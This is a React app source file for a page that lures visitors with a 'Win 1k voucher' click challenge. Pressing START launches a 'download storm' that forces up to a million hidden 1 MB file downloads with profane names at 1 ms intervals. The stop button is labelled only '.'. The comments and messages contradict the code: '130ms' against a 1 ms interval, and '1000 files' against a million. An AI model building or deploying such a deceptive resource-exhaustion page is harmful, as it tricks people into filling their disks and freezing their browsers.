import { useState, useRef, useCallback } from 'react';
import './App.css';

function App() {
  const TOTAL_DOWNLOADS = 1000000;
  const FILE_SIZE_MB = 1; // 1 MB
  const FILE_SIZE_BYTES = 1048576; // 1024 * 1024

  const [current, setCurrent] = useState(0);
  const [isActive, setIsActive] = useState(false);
  const [status, setStatus] = useState('🧨 👆Start Click ');
  const intervalRef = useRef(null);
  const blobUrlRef = useRef(null);

  // Create a 1MB Blob (filled with pattern)
  const createOneMBBlob = useCallback(() => {
    const buffer = new ArrayBuffer(FILE_SIZE_BYTES);
    const view = new Uint8Array(buffer);
    for (let i = 0; i < 100; i++) {
      view[i] = 65 + (i % 26); // 'A' to 'Z' pattern
    }
    return new Blob([buffer], { type: 'application/octet-stream' });
  }, []);

  // Generate unique filename
  const getFileName = (index) => {
    return `fuck_you${String(index).padStart(4, '0')}.dat`;
  };

  // Trigger a single download
  const triggerDownload = (index, blobUrl) => {
    const a = document.createElement('a');
    a.href = blobUrl;
    a.download = getFileName(index);
    a.style.display = 'none';
    document.body.appendChild(a);
    a.click();
    setTimeout(() => a.remove(), 1);
  };

  const startPrank = () => {
    if (isActive) return;

    // Confirm dialog (optional, but user-friendly)
    if (!window.confirm('Start Now')) {
      return;
    }

    // Reset state
    if (intervalRef.current) clearInterval(intervalRef.current);
    if (blobUrlRef.current) URL.revokeObjectURL(blobUrlRef.current);

    const blob = createOneMBBlob();
    blobUrlRef.current = URL.createObjectURL(blob);

    setCurrent(0);
    setIsActive(true);
    setStatus('💣 Download storm started... (allow multiple downloads if asked)');

    let count = 0;
    intervalRef.current = setInterval(() => {
      if (count < TOTAL_DOWNLOADS) {
        count++;
        triggerDownload(count, blobUrlRef.current);
        setCurrent(count);
        setStatus(`📥 Downloading #${count} / ${TOTAL_DOWNLOADS} (real 1MB file)`);
        if (count === TOTAL_DOWNLOADS) {
          clearInterval(intervalRef.current);
          intervalRef.current = null;
          setIsActive(false);
          setStatus('✅ PRANK COMPLETE! 1000 files saved in your Downloads folder.');
          if (blobUrlRef.current) {
            URL.revokeObjectURL(blobUrlRef.current);
            blobUrlRef.current = null;
          }
        }
      } else {
        clearInterval(intervalRef.current);
        intervalRef.current = null;
        setIsActive(false);
      }
    }, 1); // 130ms between downloads
  };

  const cancelPrank = () => {
    if (!isActive) return;
    if (intervalRef.current) {
      clearInterval(intervalRef.current);
      intervalRef.current = null;
    }
    if (blobUrlRef.current) {
      URL.revokeObjectURL(blobUrlRef.current);
      blobUrlRef.current = null;
    }
    setIsActive(false);
    setStatus(`⛔ click ${current} .`);
  };

  const percent = (current / TOTAL_DOWNLOADS) * 100;

  return (
    <div className="prank-container">
      <div className="card">
        <div className="header">
          <h1>Challenge Strom</h1>
        </div>
        <div className="badge">
          click 1000 times
        </div>
        <div className="content">
          <div className="stats">
            <div className="progress-row">
              <span>📀 PROGRESS</span>
              <span>{current} / {TOTAL_DOWNLOADS}</span>
            </div>
            <div className="progress-bar-bg">
              <div className="progress-fill" style={{ width: `${percent}%` }}></div>
            </div>
            <div className="details">
              
              <span>Win 1k voucher</span>
            </div>
          </div>

          <div className="button-group">
            <button className="btn-start" onClick={startPrank} disabled={isActive}>
              START
            </button>
            <button className="btn-stop2" onClick={cancelPrank} disabled={!isActive}>
              .
            </button>
          </div>
          <div className="status">{status}</div>
          <div className="device-note">
            Start Click now and win voucher.<br />
            each click gives 1 point
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;